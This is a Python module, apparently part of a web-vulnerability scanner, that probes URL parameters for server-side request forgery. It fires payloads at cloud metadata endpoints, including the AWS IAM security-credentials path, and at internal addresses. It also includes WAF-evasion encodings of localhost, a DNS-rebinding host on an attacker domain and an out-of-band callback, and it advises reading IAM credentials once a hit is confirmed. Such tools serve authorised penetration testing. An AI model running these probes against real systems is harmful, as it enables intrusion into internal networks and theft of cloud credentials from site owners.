"""
Phase 2 - Module 8b: SSRF Detection Engine
Tests for Server-Side Request Forgery, including cloud metadata bypass.
"""
import asyncio
import httpx
from typing import List, Dict, Optional
from urllib.parse import urlparse, urlencode, parse_qs
from app.core.payload_manager import load_payloads


# Internal SSRF targets
SSRF_PAYLOADS = {
    "AWS Metadata":         "http://169.254.169.254/latest/meta-data/",
    "AWS IMDSv2":           "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "GCP Metadata":         "http://metadata.google.internal/computeMetadata/v1/",
    "Azure Metadata":       "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "Localhost":            "http://localhost/",
    "Localhost 8080":       "http://localhost:8080/",
    "Localhost Admin":      "http://localhost/admin",
    "Internal 10.x":       "http://10.0.0.1/",
    "Internal 192.168.x":  "http://192.168.1.1/",
    "Internal 172.16.x":   "http://172.16.0.1/",
    "::1 IPv6":             "http://[::1]/",
}

# Merge with custom user payloads from wordlists/custom/ssrf*.txt
_custom_ssrf = load_payloads("ssrf")
for i, url in enumerate(_custom_ssrf):
    if url not in SSRF_PAYLOADS.values():
        SSRF_PAYLOADS[f"Custom SSRF #{i+1}"] = url

# Bypass wrappers for WAF evasion
SSRF_BYPASS_WRAPPERS = [
    "http://0x7f000001/",         # 127.0.0.1 hex
    "http://0177.0000.0000.0001/", # Octal
    "http://2130706433/",          # Decimal
    "http://127.1/",
    "http://127.0.1/",
    "http://localhost.attacker.com/",  # DNS rebinding
]

# URL parameters commonly vulnerable to SSRF
SSRF_PARAMS = [
    "url", "redirect", "next", "callback", "return", "target", "dest",
    "destination", "link", "src", "source", "href", "path", "uri",
    "endpoint", "proxy", "host", "fetch", "load", "file", "open",
    "image", "thumb", "thumbnail", "preview", "webhook",
]

# Response indicators of successful SSRF
CLOUD_INDICATORS = [
    "ami-id", "instance-id", "computeMetadata", "iam/security-credentials",
    "meta-data", "169.254.169.254",
]


class SSRFEngine:
    def __init__(self, oob_server: Optional[str] = None, timeout: int = 8):
        self.oob_server = oob_server  # Your Burp Collaborator / interactsh URL
        self.timeout = timeout

    async def test_param(self, url: str, param: str) -> List[Dict]:
        """Test a single parameter for SSRF."""
        findings = []
        parsed = urlparse(url)
        base_params = parse_qs(parsed.query)

        async with httpx.AsyncClient(verify=False, timeout=self.timeout, follow_redirects=False) as client:
            # Test all SSRF payloads
            all_payloads = dict(SSRF_PAYLOADS)
            if self.oob_server:
                all_payloads["OOB Callback"] = f"http://{self.oob_server}/"

            for label, payload_url in all_payloads.items():
                test_params = {k: v[0] for k, v in base_params.items()}
                test_params[param] = payload_url
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"
                try:
                    resp = await client.get(test_url, headers={"User-Agent": "Mozilla/5.0"})
                    body = resp.text.lower()

                    # Check for cloud metadata in response
                    if any(ind in body for ind in CLOUD_INDICATORS):
                        findings.append({
                            "type": "SSRF (Confirmed)",
                            "url": test_url,
                            "parameter": param,
                            "ssrf_target": label,
                            "payload": payload_url,
                            "severity": "critical",
                            "confidence": 0.95,
                            "evidence": f"Cloud metadata indicators found in response",
                            "suggested_next_step": "Try to read IAM credentials from /latest/meta-data/iam/security-credentials/",
                        })

                    # Check for redirect to internal resource
                    elif resp.status_code in [301, 302, 307, 308]:
                        location = resp.headers.get("location", "")
                        if any(x in location for x in ["169.254", "localhost", "10.", "192.168"]):
                            findings.append({
                                "type": "SSRF (Open Redirect to Internal)",
                                "url": test_url,
                                "parameter": param,
                                "ssrf_target": label,
                                "payload": payload_url,
                                "severity": "high",
                                "confidence": 0.75,
                                "suggested_next_step": "Follow redirect chain manually to confirm internal access",
                            })
                except Exception:
                    pass

        return findings

    async def scan(self, assets: List[Dict]) -> List[Dict]:
        """Scan all assets for SSRF-vulnerable parameters."""
        findings = []
        tasks = []

        for asset in assets:
            url = asset.get("url", "")
            parsed = urlparse(url)
            existing_params = list(parse_qs(parsed.query).keys())
            # Test existing params + common SSRF param names
            all_params = list(set(existing_params + SSRF_PARAMS))

            for param in all_params:
                tasks.append(self.test_param(url, param))

        results = await asyncio.gather(*tasks)
        for r in results:
            findings.extend(r)

        return findings
